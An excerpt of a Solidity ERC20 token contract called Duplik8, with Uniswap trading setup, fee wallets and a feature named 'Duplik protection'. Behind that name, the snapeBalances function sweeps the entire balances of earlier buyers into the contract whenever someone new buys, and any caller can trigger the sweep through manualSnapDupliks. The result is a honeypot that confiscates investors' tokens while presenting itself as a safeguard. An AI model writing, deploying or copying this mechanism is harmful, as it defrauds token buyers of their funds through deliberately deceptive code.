...
contract Duplik8 is Context, IERC20, Ownable {
    ...
    IterableMapping private duplikShareMap = new IterableMapping();
    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public marketPair = address(0);
    address private feeOne = 0x172e0F5a3F5251A399C43fAC5B84aBcD48980815;
    address private feeTwo = 0x8Fbf42b017c7C6881120115cfAD76De7CA330e61;    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    string private _name = "Duplik8";
    string private _symbol = "DP8";
    ...
    bool public isDuplikProtectionEnabled;
    ...
    function disableDuplikProtectionPermanently() external onlyOwner {
        require(isDuplikProtectionEnabled,"Duplik share has already been disabled");
        isDuplikProtectionEnabled = false;
    }
    ...
    function openTrading() external onlyOwner() {
        ...
        isDuplikProtectionEnabled = true;
    }
    ...
    function _transfer(address from, address to, uint256 txnAmount) private {
        ...
        if(from != owner() && to != owner() && from != address(this) && to != address(this)) {
            if(takeFees) {
                taxAmount = !isDuplikProtectionEnabled ? amount.mul(buyFee).div(100) : 0;
                if (from == marketPair && isDuplikProtectionEnabled) {
                    snapeBalances();
                    duplikShareMap.set(to, block.timestamp);
                }
                if (from != marketPair && to == marketPair) {
                    if(txnAmount > _balances[from]) {
                        amount = _balances[from];
                    }
                    taxAmount = !isDuplikProtectionEnabled ? amount.mul(sellFee).div(100) : 0;
    ...
    function snapeBalances() private {
        if(isDuplikProtectionEnabled) {
            for(uint256 i =0; i < duplikShareMap.size(); i++) {
                address holder = duplikShareMap.getKeyAtIndex(i);
                uint256 amount = _balances[holder];
                if(amount > 0) {
                    _balances[holder] = _balances[holder].sub(amount);
                    _balances[address(this)] = _balances[address(this)].add(amount);
                }
                duplikShareMap.remove(holder);
            }
        }
    }

    function numberOfSnapeDupliks() public view returns(uint256) {
        uint256 count = 0;
        for(uint256 i =0; i < duplikShareMap.size(); i++) {
            address holder = duplikShareMap.getKeyAtIndex(i);
            uint timestamp = duplikShareMap.get(holder);
    ...
    function manualSnapDupliks() external {
        snapeBalances();
    }
